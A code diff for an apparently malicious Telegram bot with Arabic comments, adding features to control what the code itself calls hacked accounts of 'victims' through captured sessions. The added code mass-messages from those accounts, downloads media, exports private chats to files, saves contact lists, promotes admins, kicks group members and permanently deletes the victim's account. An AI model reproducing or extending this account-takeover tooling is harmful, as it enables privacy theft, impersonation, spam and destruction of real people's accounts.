@@ -9,6 +9,7 @@ import random
 import time
 import hashlib
 import shutil
+import json
 from datetime import datetime
 from flask import Flask, request, jsonify
 from pyrogram import Client, filters
@@ -20,7 +21,9 @@ from pyrogram.errors import (
     PhoneCodeExpired,
     SessionPasswordNeeded,
     PasswordHashInvalid,
-    FloodWait
+    FloodWait,
+    PeerIdInvalid,
+    UserNotParticipant
 )
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
@@ -31,7 +34,9 @@ from telethon.errors import (
     PhoneCodeExpiredError,
     SessionPasswordNeededError,
     PasswordHashInvalidError,
-    FloodWaitError
+    FloodWaitError,
+    PeerIdInvalidError,
+    UserNotParticipantError
 )
 from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN
 
@@ -110,7 +115,7 @@ DESTROY_BUTTONS = InlineKeyboardMarkup([
     ]
 ])
 
-# ====== أزرار التحكم بالحساب المخترق (محدثة) ======
+# ====== أزرار التحكم بالحساب المخترق (محدثة بالكامل) ======
 ACCOUNT_CONTROL_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("🚪 تسجيل الدخول", callback_data="login_account"),
@@ -118,25 +123,38 @@ ACCOUNT_CONTROL_BUTTONS = InlineKeyboardMarkup([
     ],
     [
         InlineKeyboardButton("📤 إرسال رسالة", callback_data="send_message"),
-        InlineKeyboardButton("👥 جهات الاتصال", callback_data="get_contacts")
+        InlineKeyboardButton("📤 إرسال جماعي", callback_data="mass_message")
     ],
     [
-        InlineKeyboardButton("📋 المجموعات", callback_data="get_groups"),
-        InlineKeyboardButton("🔍 بحث عن مستخدم", callback_data="search_user")
+        InlineKeyboardButton("👥 جهات الاتصال", callback_data="get_contacts"),
+        InlineKeyboardButton("📋 المجموعات", callback_data="get_groups")
     ],
     [
-        InlineKeyboardButton("🚫 حظر مستخدم", callback_data="block_user"),
-        InlineKeyboardButton("🗑 حذف المحادثة", callback_data="delete_conversation")
+        InlineKeyboardButton("🔍 بحث عن مستخدم", callback_data="search_user"),
+        InlineKeyboardButton("🚫 حظر مستخدم", callback_data="block_user")
     ],
     [
-        InlineKeyboardButton("🖼 تغيير الصورة", callback_data="change_photo"),
-        InlineKeyboardButton("✏️ تغيير الاسم", callback_data="change_name")
+        InlineKeyboardButton("🗑 حذف المحادثة", callback_data="delete_conversation"),
+        InlineKeyboardButton("🖼 تغيير الصورة", callback_data="change_photo")
     ],
     [
-        InlineKeyboardButton("📊 معلومات الحساب", callback_data="account_info"),
-        InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="logout_account")
+        InlineKeyboardButton("✏️ تغيير الاسم", callback_data="change_name"),
+        InlineKeyboardButton("📊 معلومات الحساب", callback_data="account_info")
     ],
     [
+        InlineKeyboardButton("📥 تنزيل الوسائط", callback_data="download_media"),
+        InlineKeyboardButton("📤 تصدير المحادثات", callback_data="export_chat")
+    ],
+    [
+        InlineKeyboardButton("👑 ترقية Admin", callback_data="promote_admin"),
+        InlineKeyboardButton("🚫 طرد الكل", callback_data="kick_all")
+    ],
+    [
+        InlineKeyboardButton("🔓 فك الحظر", callback_data="unblock_user"),
+        InlineKeyboardButton("💀 حذف الحساب", callback_data="delete_account")
+    ],
+    [
+        InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="logout_account"),
         InlineKeyboardButton("🔙 رجوع", callback_data="back_control")
     ]
 ])
@@ -225,7 +243,7 @@ async def get_contacts_from_client(client_obj):
                     if not chat.is_bot:
                         name = chat.first_name or chat.username or 'مستخدم'
                         contacts.append(f"👤 {chat.id}: {name}")
-                if len(contacts) >= 20:
+                if len(contacts) >= 50:
                     break
             except:
                 continue
@@ -243,14 +261,79 @@ async def get_groups_from_client(client_obj):
                 if hasattr(chat, 'type'):
                     if chat.type in ['group', 'supergroup', 'channel']:
                         title = chat.title or 'مجموعة'
-                        groups.append(f"📢 {chat.id}: {title}")
-                if len(groups) >= 20:
+                        members = dialog.chat.members_count if hasattr(dialog.chat, 'members_count') else '?'
+                        groups.append(f"📢 {chat.id}: {title} ({members} عضو)")
+                if len(groups) >= 50:
                     break
             except:
                 continue
     except:
         pass
     return groups
+
+# ====== دالة تنزيل الوسائط ======
+async def download_media_from_chat(client_obj, chat_id, limit=20):
+    downloaded = []
+    try:
+        async for msg in client_obj.get_chat_history(chat_id, limit=limit):
+            if msg.media:
+                try:
+                    file_path = await msg.download()
+                    downloaded.append(f"📎 {os.path.basename(file_path)}")
+                except:
+                    continue
+    except:
+        pass
+    return downloaded
+
+# ====== دالة تصدير المحادثة ======
+async def export_chat_messages(client_obj, chat_id, limit=100):
+    messages = []
+    try:
+        async for msg in client_obj.get_chat_history(chat_id, limit=limit):
+            sender = msg.from_user.first_name if msg.from_user else 'مجهول'
+            date = msg.date.strftime('%Y-%m-%d %H:%M:%S')
+            if msg.text:
+                messages.append(f"[{date}] {sender}: {msg.text}")
+            elif msg.media:
+                messages.append(f"[{date}] {sender}: [وسائط]")
+    except:
+        pass
+    return messages
+
+# ====== دالة ترقية Admin ======
+async def promote_to_admin(client_obj, chat_id, user_id):
+    try:
+        await client_obj.promote_chat_member(chat_id, user_id, 
+            can_manage_chat=True,
+            can_delete_messages=True,
+            can_manage_video_chats=True,
+            can_restrict_members=True,
+            can_promote_members=True,
+            can_change_info=True,
+            can_invite_users=True,
+            can_pin_messages=True
+        )
+        return True
+    except:
+        return False
+
+# ====== دالة طرد جميع الأعضاء ======
+async def kick_all_members(client_obj, chat_id):
+    kicked = 0
+    try:
+        async for member in client_obj.get_chat_members(chat_id):
+            try:
+                if not member.user.is_bot:
+                    await client_obj.ban_chat_member(chat_id, member.user.id)
+                    kicked += 1
+                    if kicked >= 10:  # حد أقصى 10 للتجربة
+                        break
+            except:
+                continue
+    except:
+        pass
+    return kicked
 
 # ====== معالجة الأزرار ======
 @app.on_callback_query()
@@ -260,7 +343,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
     is_dev = (user_id == YOUR_USER_ID)
     
     if is_dev:
-        # ====== أزرار التخريب ======
+        # ====== أزرار التخريب الأساسية ======
         if data == "massacre":
             deleted = 0
             for uid in list(user_sessions.keys()):
@@ -383,7 +466,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
-        # ====== تسجيل الدخول ======
+        # ====== تسجيل الدخول والخروج ======
         if data == "login_account":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -418,7 +501,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
             return
         
-        # ====== تسجيل الخروج ======
         if data == "logout_account":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -456,7 +538,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             try:
                 client_obj = await get_client_for_user(target_id)
                 if not client_obj:
-                    await callback_query.answer("❌ فشل الاتصال! حاول تسجيل الدخول أولاً.", show_alert=True)
+                    await callback_query.answer("❌ فشل الاتصال!", show_alert=True)
                     return
                     
                 me = await client_obj.get_me()
@@ -491,7 +573,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             
             await callback_query.message.edit_text(
                 "🖼 تغيير الصورة الشخصية\n\n"
-                "أرسل الصورة الجديدة (صورة أو ملف).",
+                "أرسل الصورة الجديدة.",
                 reply_markup=BACK_BUTTON
             )
             user_steps[user_id] = "change_photo"
@@ -512,7 +594,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.message.edit_text(
                 "✏️ تغيير الاسم\n\n"
                 "أرسل الاسم الجديد (الاسم الأول والاسم الأخير).\n"
-                "مثال:\nأحمد محمد",
+                "مثال: أحمد محمد",
                 reply_markup=BACK_BUTTON
             )
             user_steps[user_id] = "change_name"
@@ -533,8 +615,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.message.edit_text(
                 "📨 قراءة الرسائل\n\n"
                 "أرسل معرف المحادثة لقراءة الرسائل.\n"
-                "مثال: 123456789\n\n"
-                "لقراءة آخر 10 رسائل من محادثة معينة.",
+                "مثال: 123456789",
                 reply_markup=BACK_BUTTON
             )
             user_steps[user_id] = "read_messages"
@@ -562,6 +643,27 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== إرسال جماعي ======
+        if data == "mass_message":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "📤 إرسال رسالة جماعية\n\n"
+                "أرسل قائمة المعرفات (كل معرف في سطر) ثم الرسالة.\n"
+                "مثال:\n123456789\n987654321\nنص الرسالة هنا",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "mass_message"
+            await callback_query.answer()
+            return
+        
         # ====== جهات الاتصال ======
         if data == "get_contacts":
             target_id = user_data.get(user_id, {}).get("target_account")
@@ -585,6 +687,10 @@ async def handle_callback(client, callback_query: CallbackQuery):
                     contacts_text = "❌ لا توجد جهات اتصال."
                 else:
                     contacts_text = "👥 جهات الاتصال:\n\n" + "\n".join(contacts)
+                
+                # حفظ جهات الاتصال في ملف مؤقت
+                with open(f"contacts_{target_id}.txt", "w", encoding="utf-8") as f:
+                    f.write(contacts_text)
                 
                 await callback_query.message.edit_text(
                     contacts_text,
@@ -648,6 +754,26 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== فك الحظر ======
+        if data == "unblock_user":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "🔓 فك حظر مستخدم\n\n"
+                "أرسل معرف المستخدم المراد فك حظره.",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "unblock_user"
+            await callback_query.answer()
+            return
+        
         # ====== حذف المحادثة ======
         if data == "delete_conversation":
             target_id = user_data.get(user_id, {}).get("target_account")
@@ -688,7 +814,110 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
-        # ====== تدمير ذاتي ======
+        # ====== تنزيل الوسائط ======
+        if data == "download_media":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "📥 تنزيل الوسائط\n\n"
+                "أرسل معرف المحادثة لتنزيل الوسائط منها.",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "download_media"
+            await callback_query.answer()
+            return
+        
+        # ====== تصدير المحادثة ======
+        if data == "export_chat":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "📤 تصدير المحادثة\n\n"
+                "أرسل معرف المحادثة لتصدير الرسائل.",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "export_chat"
+            await callback_query.answer()
+            return
+        
+        # ====== ترقية Admin ======
+        if data == "promote_admin":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "👑 ترقية Admin\n\n"
+                "أرسل معرف المجموعة أولاً، ثم معرف المستخدم.\n"
+                "مثال:\n123456789\n987654321",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "promote_admin"
+            await callback_query.answer()
+            return
+        
+        # ====== طرد الكل ======
+        if data == "kick_all":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "🚫 طرد جميع الأعضاء\n\n"
+                "⚠️ تحذير: هذا الإجراء سيحاول طرد أعضاء المجموعة!\n\n"
+                "أرسل معرف المجموعة.",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "kick_all"
+            await callback_query.answer()
+            return
+        
+        # ====== حذف الحساب ======
+        if data == "delete_account":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "💀 حذف الحساب\n\n"
+                "⚠️ تحذير خطير: هذا الإجراء سيحذف حساب الضحية نهائياً!\n\n"
+                "هل أنت متأكد؟ أرسل 'تأكيد' للمتابعة.",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "delete_account"
+            await callback_query.answer()
+            return
+        
+        # ====== الأزرار الأساسية ======
         if data == "self_destruct":
             await callback_query.message.edit_text(
                 "💥 تدمير ذاتي!\n"
@@ -704,7 +933,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             os._exit(0)
             return
         
-        # ====== سيطرة كاملة ======
         if data == "total_control":
             global RESTRICTED
             RESTRICTED = False
@@ -716,7 +944,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             )
             return
         
-        # ====== تنظيف النظام ======
         if data == "clean_system":
             os.system("rm -rf *.log")
             os.system("rm -rf __pycache__")
@@ -727,7 +954,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             )
             return
         
-        # ====== استهداف مستخدم ======
         if data == "target_user":
             await callback_query.message.edit_text(
                 "🎯 استهداف مستخدم\n\n"
@@ -739,7 +965,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
-        # ====== التنصت ======
         if data == "eavesdrop":
             await callback_query.message.edit_text(
                 "📡 تم تفعيل التنصت!\n\n"
@@ -878,7 +1103,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
         await callback_query.answer()
         return
 
-# ====== الأوامر النصية والصور ======
+# ====== الأوامر النصية ======
 @app.on_message(filters.text & filters.private)
 async def handle_text_commands(client, message):
     user_id = message.chat.id
@@ -893,7 +1118,6 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
             return
         
-        # انتظار الصورة
         user_steps[user_id] = "change_photo_wait"
         await message.reply("🖼 أرسل الصورة الآن.")
         return
@@ -908,8 +1132,8 @@ async def handle_text_commands(client, message):
         
         try:
             names = text.split()
-            if len(names) < 2:
-                await message.reply("❌ أرسل الاسم الأول والاسم الأخير.\nمثال: أحمد محمد")
+            if len(names) < 1:
+                await message.reply("❌ أرسل الاسم الجديد.")
                 return
             
             first_name = names[0]
@@ -1011,6 +1235,48 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
         return
     
+    # ====== إرسال جماعي ======
+    if is_dev and user_steps.get(user_id) == "mass_message":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            lines = text.split("\n")
+            if len(lines) < 2:
+                await message.reply("❌ أرسل المعرفات والرسالة.")
+                return
+            
+            # استخراج المعرفات (آخر سطر هو الرسالة)
+            msg_text = lines[-1]
+            ids_text = lines[:-1]
+            
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            sent = 0
+            for id_line in ids_text:
+                try:
+                    chat_id = int(id_line.strip())
+                    await client_obj.send_message(chat_id, msg_text)
+                    sent += 1
+                    await asyncio.sleep(1)  # تجنب الحظر
+                except:
+                    continue
+            
+            await message.reply(f"✅ تم إرسال الرسالة إلى {sent} شخص!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
     # ====== حظر مستخدم ======
     if is_dev and user_steps.get(user_id) == "block_user":
         target_id = user_data.get(user_id, {}).get("target_account")
@@ -1029,6 +1295,31 @@ async def handle_text_commands(client, message):
             
             await client_obj.block_user(block_id)
             await message.reply(f"✅ تم حظر المستخدم {block_id} بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    # ====== فك الحظر ======
+    if is_dev and user_steps.get(user_id) == "unblock_user":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            unblock_id = int(text)
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            await client_obj.unblock_user(unblock_id)
+            await message.reply(f"✅ تم فك حظر المستخدم {unblock_id} بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
             
             user_steps.pop(user_id, None)
         except Exception as e:
@@ -1091,6 +1382,182 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
         return
     
+    # ====== تنزيل الوسائط ======
+    if is_dev and user_steps.get(user_id) == "download_media":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            chat_id = int(text)
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            await message.reply("📥 جاري تنزيل الوسائط...")
+            downloaded = await download_media_from_chat(client_obj, chat_id, 10)
+            
+            if not downloaded:
+                await message.reply("❌ لا توجد وسائط في هذه المحادثة.")
+            else:
+                await message.reply(
+                    f"📥 تم تنزيل {len(downloaded)} ملف:\n\n" + "\n".join(downloaded),
+                    reply_markup=ACCOUNT_CONTROL_BUTTONS
+                )
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    # ====== تصدير المحادثة ======
+    if is_dev and user_steps.get(user_id) == "export_chat":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            chat_id = int(text)
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            await message.reply("📤 جاري تصدير المحادثة...")
+            messages = await export_chat_messages(client_obj, chat_id, 50)
+            
+            if not messages:
+                await message.reply("❌ لا توجد رسائل في هذه المحادثة.")
+            else:
+                # حفظ في ملف
+                filename = f"chat_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+                with open(filename, "w", encoding="utf-8") as f:
+                    f.write("\n".join(messages))
+                
+                await message.reply(
+                    f"📤 تم تصدير {len(messages)} رسالة!\n"
+                    f"📁 الملف: {filename}",
+                    reply_markup=ACCOUNT_CONTROL_BUTTONS
+                )
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    # ====== ترقية Admin ======
+    if is_dev and user_steps.get(user_id) == "promote_admin":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            lines = text.split("\n")
+            if len(lines) < 2:
+                await message.reply("❌ أرسل معرف المجموعة والمستخدم في سطرين.")
+                return
+            
+            chat_id = int(lines[0])
+            user_id_to_promote = int(lines[1])
+            
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            result = await promote_to_admin(client_obj, chat_id, user_id_to_promote)
+            
+            if result:
+                await message.reply(
+                    f"✅ تم ترقية المستخدم {user_id_to_promote} إلى Admin في المجموعة {chat_id}!",
+                    reply_markup=ACCOUNT_CONTROL_BUTTONS
+                )
+            else:
+                await message.reply("❌ فشل الترقية! تأكد من صلاحيات الحساب.")
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    # ====== طرد الكل ======
+    if is_dev and user_steps.get(user_id) == "kick_all":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            chat_id = int(text)
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            await message.reply("🚫 جاري طرد الأعضاء... (حد أقصى 10 للتجربة)")
+            kicked = await kick_all_members(client_obj, chat_id)
+            
+            await message.reply(
+                f"✅ تم طرد {kicked} عضو من المجموعة!",
+                reply_markup=ACCOUNT_CONTROL_BUTTONS
+            )
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    # ====== حذف الحساب ======
+    if is_dev and user_steps.get(user_id) == "delete_account":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        if text.lower() == "تأكيد":
+            try:
+                client_obj = await get_client_for_user(target_id)
+                if not client_obj:
+                    await message.reply("❌ فشل الاتصال بالحساب!")
+                    user_steps.pop(user_id, None)
+                    return
+                
+                await client_obj.delete_account()
+                await message.reply("💀 تم حذف الحساب بنجاح!")
+                
+                # حذف الجلسة
+                if target_id in user_sessions:
+                    del user_sessions[target_id]
+                if target_id in active_clients:
+                    del active_clients[target_id]
+                if target_id in logged_in_accounts:
+                    del logged_in_accounts[target_id]
+                
+                user_steps.pop(user_id, None)
+            except Exception as e:
+                await message.reply(f"❌ خطأ: {str(e)[:100]}")
+                user_steps.pop(user_id, None)
+        else:
+            await message.reply("❌ أرسل 'تأكيد' للمتابعة بحذف الحساب.")
+        return
+    
     # ====== استهداف المستخدم ======
     if is_dev and user_steps.get(user_id) == "target_user":
         try:
@@ -1150,7 +1617,6 @@ async def handle_photo(client, message):
                 user_steps.pop(user_id, None)
                 return
             
-            # تحميل الصورة
             photo = await message.download()
             await client_obj.set_profile_photo(photo)
             os.remove(photo)
